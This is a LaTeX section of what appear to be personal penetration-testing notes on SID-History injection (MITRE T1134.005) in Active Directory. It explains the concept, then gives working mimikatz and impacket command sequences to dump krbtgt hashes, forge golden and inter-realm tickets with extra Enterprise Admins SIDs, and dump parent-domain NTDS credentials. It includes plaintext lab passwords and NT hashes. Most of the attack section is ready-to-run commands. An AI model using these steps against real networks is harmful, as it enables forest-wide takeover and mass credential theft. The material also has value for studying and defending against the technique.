
\subsection{SID-History injection (T1134.005)}
\label{mitre:t1134.005}

\subsubsection{Introduction}

The \href{https://attack.mitre.org/techniques/T1134/005/}{sIDHistory injection} attack consist in injecting harvested or well-known SID values (administrator SID) inside the sIDHistory of a controlled account since the SIDs of the sIDHistory are added to the \emph{acces token}~\ref{win:access-token}

The {\bf SID history} is a property of a {\bf user} or {\bf group object} that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform \emph{DCSync}~\ref{kerberos:DCSync} and create a \emph{Golden Ticket}~\ref{kerberos:golden-ticker} or a Kerberos ticket-granting ticket (TGT) which will allow for us to authenticate as any account in the domain of our choosing for further persistence.


 If the \emph{sIDHistory} of a controled user in a child domain is set to  \emph{Enterprise Admins group} (which only exists in the parent domain), the user is treated as a member of this group, which allows for administrative access to the entire forest. 

 Leverage the \emph{SIDHistory} to grant an account (or  non-existent account) \emph{Enterprise Admin} rights by modifying this attribute to contain the \emph{SID for the Enterprise Admins group}, will give full access to the parent domain without actually being part of the group.

This type of attack will only work when \emph{SID filtering}~\ref{ad:security:sid-filtering} is not set.

\subsubsection{On windows}
The requierements To perform this attack after compromising a child domain,
are:
\begin{itemize}
    \item  The KRBTGT hash for the child domain (using
        mimikatz~\ref{tool:mimikatz:DCSync} on \verb+DOMAIN\krbtgt+)
    \item  The SID for the child domain (\verb+Get-DomainSID+ command)
    \item  The name of a target user in the child domain (since KB5008380 NEED TO EXIST not need)
    \item  The user RID
    \item  The FQDN of the child domain.
    \item  The SID of the Enterprise Admins group of the root domain (using
            \verb+Get-ADGroup+~\ref{tool:wlol:ad:get-ADGroup} or
            \verb+Get-DomainGroup+~\ref{tool:powerview} on identity
        \verb+"Enterprise Admins"+)
\end{itemize}

\verb+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:krbtgt"+


Using Mimikatz~\ref{tool:mimikatz:sidhistory} or Rubeus~\ref{tool:rubeus:sidhistory}
and the data listed above, it is possible to :
\begin{itemize}
    \item 
        create a Golden Ticket with extra sids to access all resources within the parent domain.
    \item
        or Create inter-realm golden ticket with trust key
\end{itemize}


to check that the ticket works : \verb+ls \\TARGET\c$\SOME\PATH+ or perform a parent domain dcsync

\subsubsection{From Linux}

To get the requiered informations :
\begin{itemize}
    \item the KRBTGT hash for the child domain:
        \verb+secretsdump.py+~\ref{tool:impacket:secretsdump}
    \item the SIDS: \verb+lookupsid.py+~\ref{tool:impacket:lookupsid}
\end{itemize}

\begin{verbatim}
secretsdump.py -just-dc -user-status admin.offshore.com/jubeaz:Zaebuj12345+-@<child_dc>
lookupsid.py -domain-sids dev.admin.offshore.com/jubeaz:Zaebuj12345+-@<child_dc>
lookupsid.py -domain-sids dev.admin.offshore.com/jubeaz:Zaebuj12345+-@<parent_dc>
\end{verbatim}



{\bf create a golden ticket with extra-sids from parent domain}:

The ticket can be forged with \verb+ticketer.py+~\ref{tool:impacket:tickerter}
and the access validated with \verb+psexec.py+~\ref{tool:impacket:psexec}

\begin{verbatim}
ticketer.py \
    -nthash 9404def404bc198fd9830a3483869e78  \
    -domain-sid S-1-5-21-1416445593-394318334-2645530166 \
    -domain dev.admin.offshore.com \
    -extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
    -user-id 11607 \
    jubeaz
\end{verbatim}

then use ticket to dump NTDS
\begin{verbatim}
KRB5CCNAME=/tmp/jubeaz.ccache secretsdump.py \
    -debug -k -no-pass -just-dc-ntlm \
    dev.admin.offshore.com/jubeaz@dc03.admin.offshore.com+
\end{verbatim}

There is also a full automated script \verb+raiseChild.py+~\ref{tool:impacket:raiseChild}

{\bf create inter-realm golden ticket with trust key}:
\begin{verbatim}
ticketer.py \
    -nthash  226469d05ed6dba030a6ac6a82391768 \
    -domain-sid S-1-5-21-1416445593-394318334-2645530166 \
    -domain dev.admin.offshore.com \
    -extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
    -spn krbtgt/admin.offshore.com
    -user-id 11607 \
    jubeaz
\end{verbatim}


request a TGS to parent domain:
\begin{verbatim}
KRB5CCNAME=/tmp/jubeaz.ccache getST.py \
    -debug -k -no-pass -spn cifs/dc03.admin.offshore.com \
    admin.offshore.com/jubeaz@admin.offshore.com
\end{verbatim}

use the service ticket:
\begin{verbatim}
KRB5CCNAME=jubeaz@admin.offshore.com.ccache smbclient.py \
    -k -no-pass jubeaz@dc03.admin.offshore.com


KRB5CCNAME=jubeaz@admin.offshore.com.ccache secretsdump.py \
    -k -no-pass -just-dc-ntlm jubeaz@dc03.admin.offshore.com
\end{verbatim}




